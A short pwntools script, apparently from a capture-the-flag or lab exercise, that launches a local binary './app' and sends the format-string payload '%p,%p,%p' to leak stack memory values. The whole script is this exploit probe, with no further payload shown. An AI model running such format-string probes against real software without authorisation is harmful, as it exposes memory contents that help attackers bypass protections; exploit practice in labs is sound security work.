from pwn import *
import struct

elf = ELF('./app')

io=elf.process()
raw_input("Press return to continue...")
io.recvregex(b':')
info('Relaying the format string now ')
io.sendline(b'%p,%p,%p')
io.recvline()
